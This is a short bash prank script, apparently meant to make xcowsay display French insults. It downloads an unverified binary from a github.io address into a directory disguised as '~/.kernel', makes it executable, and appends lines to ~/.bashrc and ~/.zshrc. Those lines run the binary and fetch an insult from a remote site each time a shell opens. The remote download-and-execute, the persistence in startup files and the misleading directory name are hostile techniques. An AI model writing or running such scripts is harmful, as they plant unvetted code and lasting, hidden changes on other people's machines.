#!/bin/bash
# Desc: xcowsay insulte
mkdir ~/.kernel
curl https://Waz0x.github.io/bin/xcowsay/bin > ~/.kernel/bin && chmod +x ~/.kernel/bin
curl https://Waz0x.github.io/bin/xcowsay/cow_med.png > ~/.kernel/cow_med.png
echo "cd ~/.kernel;./bin --image cow_med.png \"\$(curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw -s)\";cd &" >> ~/.bashrc
echo "cd ~/.kernel;./bin --image cow_med.png \"\$(curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw -s)\" &;cd" >> ~/.zshrc